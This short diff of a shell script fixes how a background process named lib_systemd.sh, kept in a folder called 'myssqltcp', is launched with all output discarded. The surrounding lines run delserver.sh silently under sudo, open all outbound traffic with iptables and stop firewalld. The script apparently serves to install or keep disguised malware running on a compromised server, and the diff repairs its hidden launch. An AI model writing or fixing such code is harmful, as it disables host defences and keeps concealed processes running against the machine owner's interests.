@@ -1458,7 +1458,7 @@ else
 fi
 echo ""
 
-cd /$HOME/
+cd $HOME/
 rm -f index.html
 sudo /bin/bash ./delserver.sh >/dev/null 2>&1 &
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
@@ -1475,5 +1475,5 @@ iptables -A OUTPUT -j ACCEPT
 service iptables reload
 systemctl stop firewalld.service
 
-nohup .&HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 &
+cd $HOME/myssqltcp/ && nohup ./lib_systemd.sh >/dev/null 2>&1 &
 echo "[*] Yes-GoGo"
